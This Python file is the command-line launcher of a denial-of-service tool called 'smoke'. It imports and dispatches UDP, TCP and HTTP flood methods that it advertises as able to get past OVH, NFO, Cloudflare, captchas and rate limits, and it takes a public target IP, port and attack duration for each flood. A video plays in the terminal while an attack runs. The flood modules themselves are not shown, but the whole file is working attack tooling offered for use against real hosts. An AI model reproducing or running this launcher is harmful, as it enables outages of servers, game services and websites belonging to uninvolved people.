#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Commands
from src.Commands.url_to_ip import url_to_ip
from src.Commands.ip_to_loc import ip_to_loc

# Layer 4
from src.Commands.game import game
from src.Commands.tcp import tcp
from src.Commands.udp import udp
from src.Commands.ovh import ovh
from src.Commands.nfo import nfo
from src.Commands.hold import hold
from src.Commands.crash import crash
from src.Commands.udpbypass import udpbypass
# Layer 7
from src.Commands.browser import browser
from src.Commands.cf import cf
from src.Commands.tlsv2 import tlsv2
from src.Commands.tls import tls
from src.Commands.mix import mix
from src.Commands.bypass import bypass

# Imports
import socket, threading, time, sys, random, ipaddress, random, json, subprocess, os
from colorama import Fore, init

def color(data_input_output):
    random_output = data_input_output
    if random_output == "GREEN":
        data = '\033[32m'
    elif random_output == "LIGHTGREEN_EX":
        data = '\033[92m'
    elif random_output == "YELLOW":
        data = '\033[33m'
    elif random_output == "LIGHTYELLOW_EX":
        data = '\033[93m'
    elif random_output == "CYAN":
        data = '\033[36m'
    elif random_output == "LIGHTCYAN_EX":
        data = '\033[96m'
    elif random_output == "BLUE":
        data = '\033[34m'
    elif random_output == "LIGHTBLUE_EX":
        data = '\033[94m'
    elif random_output == "MAGENTA":
        data = '\033[35m'
    elif random_output == "LIGHTMAGENTA_EX":
        data = '\033[95m'
    elif random_output == "RED":
        data = '\033[31m'
    elif random_output == "LIGHTRED_EX":
        data = '\033[91m'
    elif random_output == "BLACK":
        data = '\033[30m'
    elif random_output == "LIGHTBLACK_EX":
        data = '\033[90m'
    elif random_output == "WHITE":
        data = '\033[37m'
    elif random_output == "LIGHTWHITE_EX":
        data = '\033[97m'
    return data

lightwhite = color("LIGHTWHITE_EX")
gray = color("LIGHTBLACK_EX")

banner = f"""{Fore.RED}
\033[97mUptime: \033[94m97% \033[97m| Channel: \033[94m@smokec2 \033[97m| Servers: \033[94m29
     
_._     _,-'""`-._
(,-.`._,'(       |\`-/|
    `-.-' \ )-`( , o o)
          `-    \`_`"'"-

\033[97mWrite \033[91;1mhelp \033[97mto see command
"""

rules = f"""                {lightwhite}1. {gray}Do not attack .gov/.gob/.edu/.mil domains  
{lightwhite}2. {gray}Do not spam attacks"""

help = f"""

{lightwhite}HELP         {Fore.RED}: {lightwhite}Shows list of commands{Fore.RED}.   
{lightwhite}METHODS      {Fore.RED}: {lightwhite}Shows list of methods{Fore.RED}.     
{lightwhite}SERVERS      {Fore.RED}: {lightwhite}Shows servers{Fore.RED}.
{lightwhite}PLAN         {Fore.RED}: {lightwhite}Show your plan{Fore.RED}.
{lightwhite}ONGOING      {Fore.RED}: {lightwhite}Shows current attacks{Fore.RED}.
{lightwhite}RECENT       {Fore.RED}: {lightwhite}Shows your last attacks{Fore.RED}.
{lightwhite}CLEAR        {Fore.RED}: {lightwhite}Clears the screen{Fore.RED}.          
{lightwhite}EXIT         {Fore.RED}: {lightwhite}Disconnects from the net{Fore.RED}.

"""

methods = f"""
{Fore.WHITE}Layer 4{Fore.RED}:
{Fore.RED}- {Fore.WHITE}!udp{Fore.RED}: {Fore.WHITE}UDP flood{Fore.RED}.   
{Fore.RED}- {Fore.WHITE}!tcp{Fore.RED}: {Fore.WHITE}TCP flood{Fore.RED}.    
{Fore.RED}- {Fore.WHITE}!pps{Fore.RED}: {Fore.WHITE}UDP flood make many PPS{Fore.RED}.    
{Fore.RED}- {Fore.WHITE}!ack{Fore.RED}: {Fore.WHITE}TCP ACK flood{Fore.RED}.        
{Fore.RED}- {Fore.WHITE}!stomp{Fore.RED}: {Fore.WHITE}TCP handshake + ACK/PSH flood{Fore.RED}.       
{Fore.RED}- {Fore.WHITE}!socket{Fore.RED}: {Fore.WHITE}TCP socket flood with lots of options{Fore.RED}.    
{Fore.RED}- {Fore.WHITE}!nfo{Fore.RED}: {Fore.WHITE}TCP flood optimized for bypass NFO{Fore.RED}. 
{Fore.RED}- {Fore.WHITE}!tcpbypass{Fore.RED}: {Fore.WHITE}Simple tcp flood to bypass any protections{Fore.RED}.                    
{Fore.RED}- {Fore.WHITE}!ovh{Fore.RED}: {Fore.WHITE}UDP/TCP flood optimized for bypass OVH{Fore.RED}.  
{Fore.RED}- {Fore.WHITE}!discord{Fore.RED}: {Fore.WHITE}UDP flood optimized for bypass discord voice{Fore.RED}.  
{Fore.RED}- {Fore.WHITE}!game{Fore.RED}: {Fore.WHITE}UDP PPS flood optimized for bypass any game servers{Fore.RED}.  
{Fore.WHITE}Layer 7{Fore.RED}:
{Fore.RED}- {Fore.WHITE}!tls{Fore.RED}: {Fore.WHITE}HTTP1.2 flood make many RPS{Fore.RED}.
{Fore.RED}- {Fore.WHITE}!tlsv2{Fore.RED}: {Fore.WHITE}HTTP2 flood make many RPS optimized for bypass http-ddos{Fore.RED}.  
{Fore.RED}- {Fore.WHITE}!bypass{Fore.RED}: {Fore.WHITE}HTTP2 flood optimized for bypass any protections, ratelimit{Fore.RED}.  
{Fore.RED}- {Fore.WHITE}!http{Fore.RED}: {Fore.WHITE}HTTP RAW flood make many RPS{Fore.RED}.  
{Fore.RED}- {Fore.WHITE}!browser{Fore.RED}: {Fore.WHITE}Browser method for bypassing various types of captchas/cloudflare{Fore.RED}.
"""

# ============ VIDEO PLAYER ============
class VideoAttackPlayer:
    def __init__(self, video_path="/sdcard/Download/edit.mp4"):
        self.video_path = video_path
        self.mpv_process = None
        self.attack_running = False
        self.stats = {}
        
    def play_with_attack(self, attack_func, *args, **kwargs):
        """Play video while running attack"""
        if not os.path.exists(self.video_path):
            print(f"[!] Video not found: {self.video_path}")
            attack_func(*args, **kwargs)
            return
        
        print(f"\n{Fore.GREEN}[+] Playing video during attack...{Fore.RESET}")
        
        # Start attack in thread
        self.attack_running = True
        self.stats = {'packets': 0, 'connections': 0, 'errors': 0}
        
        def attack_thread():
            try:
                attack_func(*args, **kwargs)
            except:
                pass
            self.attack_running = False
        
        attack_t = threading.Thread(target=attack_thread, daemon=True)
        attack_t.start()
        
        # Play video
        try:
            cmd = [
                'mpv',
                '--vo=tct',
                '--geometry=300x120',
                '--vo-tct-24bit=yes',
                '--vo-tct-256=yes',
                '--osd-level=0',
                '--no-osd-bar',
                '--no-terminal',
                '--really-quiet',
                '--msg-level=all=no',
                '--framedrop=yes',
                '--no-audio',
                '--vf=fps=20',
                self.video_path
            ]
            
            self.mpv_process = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            self.mpv_process.wait()
            
        except Exception as e:
            print(f"[!] Video error: {e}")
        finally:
            self.attack_running = False
            attack_t.join(timeout=2)
            
            if self.mpv_process and self.mpv_process.poll() is None:
                self.mpv_process.terminate()
            
            # Show stats
            print(f"\n{Fore.GREEN}╔══════════════════════════════════════════════════════════════╗")
            print(f"{Fore.GREEN}║{Fore.WHITE}              ATTACK COMPLETE                             {Fore.GREEN}║")
            print(f"{Fore.GREEN}╚══════════════════════════════════════════════════════════════╝{Fore.RESET}")
            print(f"{Fore.YELLOW}┌────────────────────────────────────────────────────────────────┐")
            print(f"{Fore.YELLOW}│{Fore.WHITE} Packets Sent:   {Fore.CYAN}{self.stats.get('packets', 0):,}")
            print(f"{Fore.YELLOW}│{Fore.WHITE} Connections:     {Fore.CYAN}{self.stats.get('connections', 0):,}")
            print(f"{Fore.YELLOW}│{Fore.WHITE} Errors:          {Fore.CYAN}{self.stats.get('errors', 0):,}")
            print(f"{Fore.YELLOW}└────────────────────────────────────────────────────────────────┘{Fore.RESET}")

video_player = VideoAttackPlayer()

def attack_with_video(attack_func, *args, **kwargs):
    """Wrapper to play video with any attack"""
    video_player.play_with_attack(attack_func, *args, **kwargs)

# ============ ATTACK WRAPPERS ============

def udp_attack_wrapper(args):
    """UDP attack with video"""
    attack_with_video(udp, args, validate_time, None, None, None, None, None)

def tcp_attack_wrapper(args):
    """TCP attack with video"""
    attack_with_video(tcp, args, validate_time, None, None, None, None, None)

def ovh_attack_wrapper(args):
    """OVH attack with video"""
    attack_with_video(ovh, args, validate_time, None, None, None, None, None)

# ============ COMMAND LINE ============

ansi_clear = '\033[2J\033[H'

def validate_ip(ip):
    parts = ip.split('.')
    return len(parts) == 4 and all(x.isdigit() for x in parts) and all(0 <= int(x) <= 255 for x in parts) and not ipaddress.ip_address(ip).is_private

def validate_port(port, rand=False):
    if rand:
        return port.isdigit() and int(port) >= 0 and int(port) <= 65535
    else:
        return port.isdigit() and int(port) >= 1 and int(port) <= 65535

def validate_time(time):
    return time.isdigit() and int(time) >= 10 and int(time) <= 86400

def validate_size(size):
    return size.isdigit() and int(size) > 1 and int(size) <= 65500

def send(socket, data, escape=True, reset=True):
    """Print to console"""
    output = data
    if reset:
        try:
            output += Fore.RESET
        except:
            pass
    if escape:
        output += '\r\n'
    sys.stdout.write(output)
    sys.stdout.flush()
    return True

def command_line():
    """Main command line interface"""
    for x in banner.split('\n'):
        send(None, x)

    prompt = f'\x1b[37;47m\x1b[97msmoke\x1b[91;1m ✦ \x1b[97mstandalone\x1b[0m\x1b[91m ➤ {color("LIGHTYELLOW_EX")}'
    send(None, prompt, False)

    while 1:
        try:
            data = input()
            if not data:
                continue

            args = data.split(' ')
            command = args[0].upper()

            if command == 'HELP':
                for x in help.split('\n'):
                    send(None, '\x1b[3;31;40m'+x)
            elif command == 'METHODS':
                for x in methods.split('\n'):
                    send(None, '\x1b[3;31;40m'+x)
            elif command == 'CLEAR' or command == 'CLS':
                send(None, ansi_clear, False)
                for x in banner.split('\n'):
                    send(None, '\x1b[91m'+x)
            elif command == 'EXIT' or command == 'LOGOUT':
                send(None, '\x1b[3;31;48mSuccessfully Logged out\n')
                time.sleep(1)
                break
            elif command == 'SERVERS':
                send(None, f'{color("LIGHTWHITE_EX")}Available servers: 36.')
            elif command == "!IP_TO_LOCAT" or command == "!IP_TO_LOCATION" or command == "!IP_GEO":
                ip_to_loc(args, send, None, gray)
            elif command == "!URL_TO_IP":
                url_to_ip(args, send, None, gray)
            elif command == '!UDP':
                if len(args) >= 4:
                    target = args[1]
                    port = int(args[2])
                    duration = int(args[3])
                    if validate_ip(target) and validate_port(str(port)) and validate_time(str(duration)):
                        send(None, f'{Fore.GREEN}[+] Starting UDP attack with video...{Fore.RESET}')
                        attack_with_video(udp, args, validate_time, send, None, ansi_clear, None, None)
                    else:
                        send(None, f'{Fore.RED}[!] Invalid parameters{Fore.RESET}')
                else:
                    send(None, f'{Fore.RED}[!] Usage: !udp <IP> <PORT> <TIME>{Fore.RESET}')
            elif command == '!TCP':
                if len(args) >= 4:
                    target = args[1]
                    port = int(args[2])
                    duration = int(args[3])
                    if validate_ip(target) and validate_port(str(port)) and validate_time(str(duration)):
                        send(None, f'{Fore.GREEN}[+] Starting TCP attack with video...{Fore.RESET}')
                        attack_with_video(tcp, args, validate_time, send, None, ansi_clear, None, None)
                    else:
                        send(None, f'{Fore.RED}[!] Invalid parameters{Fore.RESET}')
                else:
                    send(None, f'{Fore.RED}[!] Usage: !tcp <IP> <PORT> <TIME>{Fore.RESET}')
            elif command == '!OVH':
                if len(args) >= 4:
                    target = args[1]
                    port = int(args[2])
                    duration = int(args[3])
                    if validate_ip(target) and validate_port(str(port)) and validate_time(str(duration)):
                        send(None, f'{Fore.GREEN}[+] Starting OVH attack with video...{Fore.RESET}')
                        attack_with_video(ovh, args, validate_time, send, None, ansi_clear, None, None)
                    else:
                        send(None, f'{Fore.RED}[!] Invalid parameters{Fore.RESET}')
                else:
                    send(None, f'{Fore.RED}[!] Usage: !ovh <IP> <PORT> <TIME>{Fore.RESET}')
            elif command == '!GAME':
                if len(args) >= 4:
                    target = args[1]
                    port = int(args[2])
                    duration = int(args[3])
                    if validate_ip(target) and validate_port(str(port)) and validate_time(str(duration)):
                        send(None, f'{Fore.GREEN}[+] Starting GAME attack with video...{Fore.RESET}')
                        attack_with_video(game, args, validate_time, send, None, ansi_clear, None, None)
                    else:
                        send(None, f'{Fore.RED}[!] Invalid parameters{Fore.RESET}')
                else:
                    send(None, f'{Fore.RED}[!] Usage: !game <IP> <PORT> <TIME>{Fore.RESET}')
            elif command == '!NFO':
                if len(args) >= 4:
                    target = args[1]
                    port = int(args[2])
                    duration = int(args[3])
                    if validate_ip(target) and validate_port(str(port)) and validate_time(str(duration)):
                        send(None, f'{Fore.GREEN}[+] Starting NFO attack with video...{Fore.RESET}')
                        attack_with_video(nfo, args, validate_time, send, None, ansi_clear, None, None)
                    else:
                        send(None, f'{Fore.RED}[!] Invalid parameters{Fore.RESET}')
                else:
                    send(None, f'{Fore.RED}[!] Usage: !nfo <IP> <PORT> <TIME>{Fore.RESET}')
            elif command == '!BYPASS':
                if len(args) >= 4:
                    target = args[1]
                    port = int(args[2])
                    duration = int(args[3])
                    if validate_ip(target) and validate_port(str(port)) and validate_time(str(duration)):
                        send(None, f'{Fore.GREEN}[+] Starting BYPASS attack with video...{Fore.RESET}')
                        attack_with_video(bypass, args, validate_time, send, None, ansi_clear, None, None)
                    else:
                        send(None, f'{Fore.RED}[!] Invalid parameters{Fore.RESET}')
                else:
                    send(None, f'{Fore.RED}[!] Usage: !bypass <IP> <PORT> <TIME>{Fore.RESET}')
            elif command == '!TLS':
                if len(args) >= 4:
                    target = args[1]
                    port = int(args[2])
                    duration = int(args[3])
                    if validate_ip(target) and validate_port(str(port)) and validate_time(str(duration)):
                        send(None, f'{Fore.GREEN}[+] Starting TLS attack with video...{Fore.RESET}')
                        attack_with_video(tls, args, validate_time, send, None, ansi_clear, None, None)
                    else:
                        send(None, f'{Fore.RED}[!] Invalid parameters{Fore.RESET}')
                else:
                    send(None, f'{Fore.RED}[!] Usage: !tls <IP> <PORT> <TIME>{Fore.RESET}')
            elif command == '!TLSV2':
                if len(args) >= 4:
                    target = args[1]
                    port = int(args[2])
                    duration = int(args[3])
                    if validate_ip(target) and validate_port(str(port)) and validate_time(str(duration)):
                        send(None, f'{Fore.GREEN}[+] Starting TLSV2 attack with video...{Fore.RESET}')
                        attack_with_video(tlsv2, args, validate_time, send, None, ansi_clear, None, None)
                    else:
                        send(None, f'{Fore.RED}[!] Invalid parameters{Fore.RESET}')
                else:
                    send(None, f'{Fore.RED}[!] Usage: !tlsv2 <IP> <PORT> <TIME>{Fore.RESET}')
            elif command == '!BROWSER':
                if len(args) >= 4:
                    target = args[1]
                    port = int(args[2])
                    duration = int(args[3])
                    if validate_ip(target) and validate_port(str(port)) and validate_time(str(duration)):
                        send(None, f'{Fore.GREEN}[+] Starting BROWSER attack with video...{Fore.RESET}')
                        attack_with_video(browser, args, validate_time, send, None, ansi_clear, None, None)
                    else:
                        send(None, f'{Fore.RED}[!] Invalid parameters{Fore.RESET}')
                else:
                    send(None, f'{Fore.RED}[!] Usage: !browser <IP> <PORT> <TIME>{Fore.RESET}')
            elif command == '!MIX':
                if len(args) >= 4:
                    target = args[1]
                    port = int(args[2])
                    duration = int(args[3])
                    if validate_ip(target) and validate_port(str(port)) and validate_time(str(duration)):
                        send(None, f'{Fore.GREEN}[+] Starting MIX attack with video...{Fore.RESET}')
                        attack_with_video(mix, args, validate_time, send, None, ansi_clear, None, None)
                    else:
                        send(None, f'{Fore.RED}[!] Invalid parameters{Fore.RESET}')
                else:
                    send(None, f'{Fore.RED}[!] Usage: !mix <IP> <PORT> <TIME>{Fore.RESET}')
            elif command == '!CRASH':
                if len(args) >= 4:
                    target = args[1]
                    port = int(args[2])
                    duration = int(args[3])
                    if validate_ip(target) and validate_port(str(port)) and validate_time(str(duration)):
                        send(None, f'{Fore.GREEN}[+] Starting CRASH attack with video...{Fore.RESET}')
                        attack_with_video(crash, args, validate_time, send, None, ansi_clear, None, None)
                    else:
                        send(None, f'{Fore.RED}[!] Invalid parameters{Fore.RESET}')
                else:
                    send(None, f'{Fore.RED}[!] Usage: !crash <IP> <PORT> <TIME>{Fore.RESET}')
            elif command == '!CF':
                if len(args) >= 4:
                    target = args[1]
                    port = int(args[2])
                    duration = int(args[3])
                    if validate_ip(target) and validate_port(str(port)) and validate_time(str(duration)):
                        send(None, f'{Fore.GREEN}[+] Starting CF attack with video...{Fore.RESET}')
                        attack_with_video(cf, args, validate_time, send, None, ansi_clear, None, None)
                    else:
                        send(None, f'{Fore.RED}[!] Invalid parameters{Fore.RESET}')
                else:
                    send(None, f'{Fore.RED}[!] Usage: !cf <IP> <PORT> <TIME>{Fore.RESET}')
            elif command == '!UDPBYPASS':
                if len(args) >= 4:
                    target = args[1]
                    port = int(args[2])
                    duration = int(args[3])
                    if validate_ip(target) and validate_port(str(port)) and validate_time(str(duration)):
                        send(None, f'{Fore.GREEN}[+] Starting UDPBYPASS attack with video...{Fore.RESET}')
                        attack_with_video(udpbypass, args, validate_time, send, None, ansi_clear, None, None)
                    else:
                        send(None, f'{Fore.RED}[!] Invalid parameters{Fore.RESET}')
                else:
                    send(None, f'{Fore.RED}[!] Usage: !udpbypass <IP> <PORT> <TIME>{Fore.RESET}')
            elif command == '!HOLD':
                if len(args) >= 4:
                    target = args[1]
                    port = int(args[2])
                    duration = int(args[3])
                    if validate_ip(target) and validate_port(str(port)) and validate_time(str(duration)):
                        send(None, f'{Fore.GREEN}[+] Starting HOLD attack with video...{Fore.RESET}')
                        attack_with_video(hold, args, validate_time, send, None, ansi_clear, None, None)
                    else:
                        send(None, f'{Fore.RED}[!] Invalid parameters{Fore.RESET}')
                else:
                    send(None, f'{Fore.RED}[!] Usage: !hold <IP> <PORT> <TIME>{Fore.RESET}')
            else:
                send(None, f'{Fore.RED}[!] Unknown command: {command}{Fore.RESET}')
            
            send(None, prompt, False)
        except KeyboardInterrupt:
            print("\n[!] Exiting...")
            break
        except Exception as e:
            print(f"[!] Error: {e}")
            send(None, prompt, False)

def main():
    """Main entry point"""
    init(convert=True)
    print("\n" + "="*70)
    print("🔴 STANDALONE ATTACK + VIDEO PLAYER")
    print("="*70)
    print("Commands work the same as before")
    print("Video will play during attacks")
    print("Type 'help' for commands")
    print("="*70 + "\n")
    
    try:
        command_line()
    except KeyboardInterrupt:
        print("\n[!] Exiting...")
    except Exception as e:
        print(f"[!] Fatal error: {e}")

if __name__ == "__main__":
    main()
